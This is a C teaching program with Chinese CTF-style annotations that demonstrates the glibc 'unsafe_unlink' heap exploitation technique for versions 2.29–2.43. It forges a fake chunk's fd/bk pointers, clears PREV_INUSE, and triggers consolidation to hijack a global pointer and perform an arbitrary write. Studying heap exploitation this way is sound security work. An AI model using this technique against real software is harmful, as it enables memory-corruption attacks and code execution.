/*
 * 中文导读（CTF 版）
 *
 * 手法：unsafe_unlink
 * 文件标注范围：2.29 ~ 2.43
 * 模拟漏洞：可伪造空闲 chunk 的 fd/bk，并清除后一 chunk 的 PREV_INUSE。
 * 核心流程：满足 fd->bk==P 与 bk->fd==P 后触发后向合并；unlink 的两次写把受控指针表改成指向自身附近。
 * 成功判据：随后经被改写的指针完成任意写。现代版本仍可用，但不再是古早的无条件 write-what-where。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);

	int malloc_size = 0x420; // 选择同时大于 tcache 与 fastbin 范围的尺寸，确保释放时进入合并路径。
	int header_size = 2;

	chunk0_ptr = (uint64_t*) malloc(malloc_size); // chunk0：内部承载伪空闲块，并由全局指针引用。
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); // chunk1：释放它时触发向后合并与 unlink。

	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	chunk1_hdr[0] = malloc_size;

	chunk1_hdr[1] &= ~1;

	free(chunk1_ptr);

	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	chunk0_ptr[0] = 0x4141414142424242LL;

	// 最终检查：经被劫持的 chunk0_ptr，任意写确实修改了栈上的目标字符串。
	assert(*(long *)victim_string == 0x4141414142424242L);
}
